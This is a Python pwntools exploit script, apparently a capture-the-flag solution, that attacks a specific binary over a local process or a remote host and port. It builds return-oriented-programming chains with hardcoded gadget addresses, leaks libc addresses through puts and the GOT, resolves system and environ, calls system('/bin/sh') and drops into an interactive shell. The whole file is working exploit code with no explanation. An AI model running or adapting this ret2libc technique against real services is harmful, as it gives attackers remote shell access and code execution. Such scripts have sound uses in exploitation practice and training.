import argparse
import random
from pwn import *

parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote')
parser.add_argument('-p', '--port')
parser.add_argument('-e', '--elf', metavar="FILE")
parser.add_argument('-b', '--binary', metavar="FILE")
args = parser.parse_args()

context.terminal = '/bin/bash'
context.log_level = 'debug' # this is a brute wew


p = None # this is global process variable
e = None
b = None


if args.remote:
  if args.port is None:
    print(parser.print_help())
    exit()
  p = remote(args.remote, args.port) # TODO: add a remote service URI here
elif args.binary:
  context.binary = args.binary
  p = process(args.binary)
else:
  parser.print_help()
  exit()
if args.elf:
  e = ELF(args.elf)
if args.debugger:
  if args.remote:
    print("You can't attach a debugger to a remote process")
  else:
    gdb.attach(p) # if in vagrant just run gdb and attach it.

pop_rdi = 0x0000000000400603
puts_in_got = 0x400440
got_addr = 0x600ff0 # libc_start_main addr
main = 0x400556

p.recvuntil(':\n')

payload = p64(pop_rdi)
payload += p64(got_addr)
payload += p64(0x400440)
payload += p64(main)
p.send(payload)

leak = p.recvline().strip()
libc_start_main = u64(leak + '\x00' * (8 - len(leak)))
print('Libc Start Main: ' + hex(libc_start_main))
libc_base = libc_start_main - e.symbols['__libc_start_main']
system = libc_base + e.symbols['system']
environ = libc_base + e.symbols['environ']


payload = p64(pop_rdi)
payload += p64(environ)
payload += p64(puts_in_got)
payload += p64(main)
p.recvuntil(':\n')
p.send(payload)

leak = p.recvline().strip()
argv_loc = u64(leak + '\x00' * (8 - len(leak)))

print('Argv Location: ' + hex(argv_loc))

bin_sh = argv_loc - 224

payload = p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
payload += '/bin/sh\x00'
p.recvuntil(':\n')
p.send(payload)

p.interactive()
